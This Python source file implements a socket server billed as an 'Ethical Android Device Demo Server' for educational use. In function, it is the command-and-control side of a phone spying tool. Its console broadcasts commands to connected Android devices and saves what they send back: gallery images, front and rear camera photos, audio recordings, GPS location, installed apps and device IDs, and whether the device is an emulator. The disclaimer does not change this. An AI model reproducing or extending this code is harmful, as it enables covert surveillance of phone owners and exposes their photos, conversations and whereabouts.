#!/usr/bin/env python3
"""
Ethical Android Device Demo Server - Enhanced Version 3.0
For educational purposes only - demonstrates legitimate client-server communication
with improved reliability, better logging, and enhanced user experience.
"""

import socket
import json
import threading
import os
import time
from datetime import datetime
import signal
import sys

# Create directories for received files
RECEIVED_DIR = "received_files"
IMAGES_DIR = os.path.join(RECEIVED_DIR, "images")
AUDIO_DIR = os.path.join(RECEIVED_DIR, "audio")
DOCS_DIR = os.path.join(RECEIVED_DIR, "docs")
LOG_FILE = "device_logs.json"
HISTORY_FILE = "command_history.log"
STATS_FILE = "server_stats.json"

for d in [RECEIVED_DIR, IMAGES_DIR, AUDIO_DIR, DOCS_DIR]:
    os.makedirs(d, exist_ok=True)

class DeviceSession:
    """Represents a connected device session"""
    def __init__(self, session_id, address, client_socket):
        self.session_id = session_id
        self.address = address
        self.client_socket = client_socket
        self.connected = True
        self.last_heartbeat = time.time()
        self.device_info = {}
        self.total_images_received = 0
        self.total_audio_received = 0
        self.total_commands_processed = 0
        self.bytes_received = 0
        self.bytes_sent = 0

class DemoServer:
    def __init__(self, host='0.0.0.0', port=8000):
        self.host = host
        self.port = port
        self.server_socket = None
        self.running = False
        self.sessions = {}
        self.session_counter = 0
        self.lock = threading.Lock()
        self.start_time = time.time()
        self.stats = {
            'total_connections': 0,
            'active_connections': 0,
            'total_images': 0,
            'total_audio': 0,
            'total_commands': 0,
            'uptime_start': self.start_time
        }
        
        # Load existing stats if available
        self.load_stats()

    def log(self, message):
        """Log to console with timestamp"""
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{ts}] {message}")

    def log_to_file(self, data, address):
        """Log device data to JSON file"""
        try:
            existing = []
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, 'r') as f:
                    try:
                        existing = json.load(f)
                    except:
                        existing = []
            entry = {
                "timestamp": datetime.now().isoformat(),
                "source_ip": address[0],
                "source_port": address[1],
                "data": data
            }
            existing.append(entry)
            with open(LOG_FILE, 'w') as f:
                json.dump(existing, f, indent=2)
        except Exception as e:
            self.log(f"[!] Failed to log to file: {e}")

    def log_command(self, command, session_id, result="sent"):
        """Log commands to history file"""
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(HISTORY_FILE, 'a') as f:
            f.write(f"[{ts}] Session {session_id} | Command: {command} | Result: {result}\\n")

    def update_stats(self):
        """Update server statistics"""
        with self.lock:
            self.stats['active_connections'] = len([s for s in self.sessions.values() if s.connected])
            self.stats['total_connections'] = self.session_counter
            self.stats['total_images'] = sum(s.total_images_received for s in self.sessions.values())
            self.stats['total_audio'] = sum(s.total_audio_received for s in self.sessions.values())
            self.stats['total_commands'] = sum(s.total_commands_processed for s in self.sessions.values())
            self.stats['uptime'] = time.time() - self.start_time
        
    def save_stats(self):
        """Save statistics to file"""
        try:
            with open(STATS_FILE, 'w') as f:
                json.dump(self.stats, f, indent=2)
        except Exception as e:
            self.log(f"[!] Failed to save stats: {e}")

    def load_stats(self):
        """Load statistics from file"""
        try:
            if os.path.exists(STATS_FILE):
                with open(STATS_FILE, 'r') as f:
                    self.stats = json.load(f)
        except Exception as e:
            self.log(f"[!] Failed to load stats: {e}")
            # Initialize with defaults if loading fails
            self.stats = {
                'total_connections': 0,
                'active_connections': 0,
                'total_images': 0,
                'total_audio': 0,
                'total_commands': 0,
                'uptime_start': time.time()
            }

    def start(self):
        """Start the server"""
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(10)
            self.running = True

            self.log("=" * 60)
            self.log("  ANDROID DEVICE DEMO SERVER - VERSION 3.0")
            self.log("  Educational Purpose Only")
            self.log("=" * 60)
            self.log(f"[+] Server listening on {self.host}:{self.port}")
            self.log(f"[+] Files saved to: {os.path.abspath(RECEIVED_DIR)}/")
            self.log(f"[+] Logs saved to: {LOG_FILE}")
            self.log(f"[+] Command history: {HISTORY_FILE}")
            self.log(f"[+] Server stats: {STATS_FILE}")
            self.log("=" * 60)
            self.log("\\nAvailable commands:")
            self.log("  1. download_gallery  - Request image from device gallery")
            self.log("  2. take_photo        - Request camera capture")
            self.log("  3. get_location      - Request GPS coordinates")
            self.log("  4. get_file_list     - Request gallery file list")
            self.log("  5. record_audio      - Request 5s audio recording")
            self.log("  6. get_app_list      - Request installed apps list")
            self.log("  7. get_device_info   - Request device information")
            self.log("  8. list_devices      - Show connected devices")
            self.log("  9. heartbeat         - Send heartbeat ping")
            self.log("  10. capture_front    - Request front camera capture")
            self.log("  11. capture_back     - Request rear camera capture")
            self.log("  12. stats            - Show server statistics")
            self.log("  13. help             - Show this help")
            self.log("  14. quit             - Stop server")
            self.log("=" * 60)

            # Start console command thread
            console_thread = threading.Thread(target=self.console_loop, daemon=True)
            console_thread.start()

            # Start heartbeat monitor thread
            heartbeat_thread = threading.Thread(target=self.heartbeat_monitor, daemon=True)
            heartbeat_thread.start()

            while self.running:
                try:
                    client_socket, address = self.server_socket.accept()
                    with self.lock:
                        self.session_counter += 1
                        session_id = self.session_counter
                    session = DeviceSession(session_id, address, client_socket)
                    with self.lock:
                        self.sessions[session_id] = session
                    self.stats['total_connections'] = self.session_counter

                    self.log(f"[+] New connection #{session_id} from {address[0]}:{address[1]}")
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(session,)
                    )
                    client_thread.daemon = True
                    client_thread.start()

                except OSError:
                    if self.running:
                        self.log("[!] Accept error")
                    break

        except Exception as e:
            self.log(f"[!] Error starting server: {e}")
        finally:
            if self.server_socket:
                self.server_socket.close()
            self.save_stats()

    def heartbeat_monitor(self):
        """Monitor device heartbeats and mark stale sessions"""
        while self.running:
            time.sleep(10)
            current = time.time()
            with self.lock:
                for sid, session in list(self.sessions.items()):
                    if session.connected and (current - session.last_heartbeat) > 120:
                        self.log(f"[!] Session {sid} ({session.address[0]}) timed out")
                        session.connected = False
                        try:
                            session.client_socket.close()
                        except:
                            pass

    def console_loop(self):
        """Server console for sending commands to devices"""
        while self.running:
            try:
                cmd = input("\\n> ").strip()
                if not cmd:
                    continue

                parts = cmd.split()
                command = parts[0].lower()

                if command == "quit" or command == "exit":
                    self.log("[!] Shutting down server...")
                    self.running = False
                    try:
                        self.server_socket.close()
                    except:
                        pass
                    break

                elif command == "help":
                    self.show_help()

                elif command == "list_devices":
                    self.list_devices()

                elif command == "heartbeat":
                    self.send_command_to_all("heartbeat")

                elif command == "get_device_info":
                    self.send_command_to_all("get_device_info")

                elif command == "stats":
                    self.show_stats()

                elif command in ["download_gallery", "take_photo", "get_location",
                                 "get_file_list", "record_audio", "get_app_list",
                                 "capture_front", "capture_back"]:
                    self.send_command_to_all(command)

                else:
                    print(f"Unknown command: {command}. Type 'help' for available commands.")

            except EOFError:
                break
            except Exception as e:
                self.log(f"[!] Console error: {e}")

    def show_help(self):
        """Show available commands"""
        print("\\n" + "=" * 50)
        print("  AVAILABLE COMMANDS")
        print("=" * 50)
        print("  1. download_gallery  - Request image from gallery")
        print("  2. take_photo        - Request camera capture")
        print("  3. get_location      - Request GPS coordinates")
        print("  4. get_file_list     - Request gallery file list")
        print("  5. record_audio      - Request 5s audio recording")
        print("  6. get_app_list      - Request installed apps list")
        print("  7. get_device_info   - Request device information")
        print("  8. list_devices      - Show connected devices")
        print("  9. heartbeat         - Send heartbeat ping")
        print("  10. capture_front    - Request front camera capture")
        print("  11. capture_back     - Request rear camera capture")
        print("  12. stats            - Show server statistics")
        print("  13. help             - Show this help")
        print("  14. quit             - Stop server")
        print("=" * 50)

    def show_stats(self):
        """Show server statistics"""
        self.update_stats()
        print("\\n" + "=" * 50)
        print("  SERVER STATISTICS")
        print("=" * 50)
        print(f"  Uptime: {self.stats['uptime']:.0f} seconds ({self.stats['uptime']/3600:.1f} hours)")
        print(f"  Total Connections: {self.stats['total_connections']}")
        print(f"  Active Connections: {self.stats['active_connections']}")
        print(f"  Total Images Received: {self.stats['total_images']}")
        print(f"  Total Audio Clips Received: {self.stats['total_audio']}")
        print(f"  Total Commands Processed: {self.stats['total_commands']}")
        print("=" * 50)

    def list_devices(self):
        """List all connected devices"""
        with self.lock:
            if not self.sessions:
                print("\\n  No devices connected.")
                return
            print(f"\\n  Connected Devices ({len(self.sessions)}):")
            print("  " + "-" * 70)
            print(f"  {'ID':<4} | {'IP Address':<15} | {'Model':<20} | {'Status':<8} | {'Images':<6} | {'Audio':<5}")
            print("  " + "-" * 70)
            for sid, session in self.sessions.items():
                status = "ONLINE" if session.connected else "OFFLINE"
                ip = session.address[0]
                model = session.device_info.get('model', 'Unknown')[:20]
                images = session.total_images_received
                audio = session.total_audio_received
                print(f"  {sid:<4} | {ip:<15} | {model:<20} | {status:<8} | {images:<6} | {audio:<5}")
            print("  " + "-" * 70)

    def send_command_to_all(self, command):
        """Send command to all connected devices"""
        with self.lock:
            if not self.sessions:
                print("  No devices connected.")
                return
        sent = 0
        for sid, session in list(self.sessions.items()):
            if session.connected:
                self.send_command(session, command)
                self.log_command(command, sid)
                sent += 1
        self.log(f"[+] Command '{command}' sent to {sent} device(s)")

    def send_command(self, session, command):
        """Send a command to a specific device session"""
        try:
            msg = json.dumps({"type": "command", "command": command}).encode('utf-8')
            session.client_socket.send(msg)
            with self.lock:
                session.bytes_sent += len(msg)
        except Exception as e:
            self.log(f"[!] Failed to send command to session {session.session_id}: {e}")
            session.connected = False

    def handle_client(self, session):
        """Handle individual client connection"""
        try:
            while self.running and session.connected:
                try:
                    data = session.client_socket.recv(65536)
                    if not data:
                        break

                    # Check if this is a file transfer (binary) or JSON
                    try:
                        message = json.loads(data.decode('utf-8'))
                        self.handle_json_message(session, message)
                    except (json.JSONDecodeError, UnicodeDecodeError):
                        # Binary file transfer
                        self.handle_file_data(session, data)

                except ConnectionResetError:
                    break
                except Exception as e:
                    self.log(f"[!] Session {session.session_id} error: {e}")
                    break

        except Exception as e:
            self.log(f"[!] Handler error: {e}")
        finally:
            session.connected = False
            try:
                session.client_socket.close()
            except:
                pass
            self.log(f"[-] Session {session.session_id} ({session.address[0]}) disconnected")

    def handle_json_message(self, session, message):
        """Handle incoming JSON messages"""
        msg_type = message.get("type", "info")

        if msg_type == "heartbeat":
            session.last_heartbeat = time.time()
            self.log(f"[♥] Heartbeat from session {session.session_id} ({session.address[0]})")

        elif msg_type == "device_info":
            session.device_info = message.get("device_info", {})
            session.last_heartbeat = time.time()
            self.log(f"[i] Device info from session {session.session_id}:")
            info = session.device_info
            self.log(f"    Model: {info.get('model', 'Unknown')}")
            self.log(f"    Android: {info.get('android_version', 'Unknown')}")
            self.log(f"    Emulator: {info.get('is_emulator', 'Unknown')}")
            self.log(f"    Device ID: {info.get('device_id', 'Unknown')}")
            self.log_to_file(message, session.address)

        elif msg_type == "location":
            lat = message.get("latitude", "Unknown")
            lon = message.get("longitude", "Unknown")
            acc = message.get("accuracy", "Unknown")
            self.log(f"[i] Location from session {session.session_id}:")
            self.log(f"    Latitude: {lat}")
            self.log(f"    Longitude: {lon}")
            self.log(f"    Accuracy: {acc}m")
            self.log_to_file(message, session.address)

        elif msg_type == "file_list":
            files = message.get("files", [])
            self.log(f"[i] Gallery file list from session {session.session_id}:")
            for f in files[:20]:
                self.log(f"    - {f}")
            if len(files) > 20:
                self.log(f"    ... and {len(files) - 20} more")
            self.log_to_file(message, session.address)

        elif msg_type == "app_list":
            apps = message.get("apps", [])
            self.log(f"[i] Installed apps from session {session.session_id} ({len(apps)} apps):")
            for app in apps[:15]:
                self.log(f"    - {app}")
            if len(apps) > 15:
                self.log(f"    ... and {len(apps) - 15} more")
            self.log_to_file(message, session.address)

        elif msg_type == "file_transfer_start":
            # Device is about to send a file
            filename = message.get("filename", "unknown")
            file_size = message.get("size", 0)
            file_type = message.get("file_type", "image")
            session.device_info["pending_file"] = {
                "filename": filename,
                "size": file_size,
                "type": file_type,
                "data": b""
            }
            self.log(f"[i] Receiving file from session {session.session_id}:")
            self.log(f"    Name: {filename}")
            self.log(f"    Size: {file_size} bytes")
            self.log(f"    Type: {file_type}")

            # Send acknowledgment
            ack = json.dumps({"type": "ack", "message": "ready_to_receive"}).encode('utf-8')
            session.client_socket.send(ack)
            with self.lock:
                session.bytes_sent += len(ack)

        elif msg_type == "file_transfer_complete":
            self.log(f"[+] File transfer complete from session {session.session_id}")
            self.log_to_file(message, session.address)

        elif msg_type == "command_response":
            cmd = message.get("command", "unknown")
            status = message.get("status", "unknown")
            self.log(f"[i] Command response from session {session.session_id}:")
            self.log(f"    Command: {cmd}")
            self.log(f"    Status: {status}")
            self.log_command(cmd, session.session_id, f"response: {status}")
            self.log_to_file(message, session.address)

        elif msg_type == "audio_data":
            # Audio data sent as base64 in JSON
            import base64
            audio_b64 = message.get("data", "")
            if audio_b64:
                audio_bytes = base64.b64decode(audio_b64)
                filename = f"audio_{int(time.time())}.wav"
                filepath = os.path.join(AUDIO_DIR, filename)
                with open(filepath, 'wb') as f:
                    f.write(audio_bytes)
                self.log(f"[+] Audio saved: {filepath} ({len(audio_bytes)} bytes)")
                with self.lock:
                    session.total_audio_received += 1
            self.log_to_file(message, session.address)

        elif msg_type == "capture_response":
            # Handle camera capture responses from client
            timestamp = message.get("timestamp", 0)
            capture_status = message.get("capture_status", "unknown")
            upload_status = message.get("upload_status", "unknown")
            filename = message.get("filename", "unknown")
            file_size = message.get("file_size", 0)
            
            self.log(f"[i] Capture response from session {session.session_id}:")
            self.log(f"    Timestamp: {timestamp}")
            self.log(f"    Capture Status: {capture_status}")
            self.log(f"    Upload Status: {upload_status}")
            self.log(f"    Filename: {filename}")
            self.log(f"    File Size: {file_size} bytes")
            
            if upload_status == "queued":
                self.log(f"    (Image queued for upload)")
            elif upload_status == "success":
                self.log(f"    (Image successfully uploaded)")
                with self.lock:
                    session.total_images_received += 1
            self.log_to_file(message, session.address)

        else:
            self.log(f"[i] Message from session {session.session_id}: {msg_type}")
            self.log_to_file(message, session.address)

    def handle_file_data(self, session, data):
        """Handle binary file data"""
        pending = session.device_info.get("pending_file")
        if pending:
            pending["data"] += data

            # Check if we have all the data
            if len(pending["data"]) >= pending["size"]:
                # Save the file
                file_type = pending["type"]
                if file_type == "image":
                    save_dir = IMAGES_DIR
                elif file_type == "audio":
                    save_dir = AUDIO_DIR
                else:
                    save_dir = DOCS_DIR

                filename = pending["filename"]
                filepath = os.path.join(save_dir, filename)
                with open(filepath, 'wb') as f:
                    f.write(pending["data"])

                self.log(f"[+] File saved: {filepath} ({len(pending['data'])} bytes)")
                with self.lock:
                    if file_type == "image":
                        session.total_images_received += 1
                    elif file_type == "audio":
                        session.total_audio_received += 1

                # Send acknowledgment
                ack = json.dumps({
                    "type": "ack",
                    "message": "file_received",
                    "filename": filename
                }).encode('utf-8')
                session.client_socket.send(ack)
                with self.lock:
                    session.bytes_sent += len(ack)

                # Clear pending file
                session.device_info.pop("pending_file", None)

        else:
            self.log(f"[*] Unexpected binary data from session {session.session_id} ({len(data)} bytes)")


if __name__ == "__main__":
    server = DemoServer(host='0.0.0.0', port=8000)
    server.start()
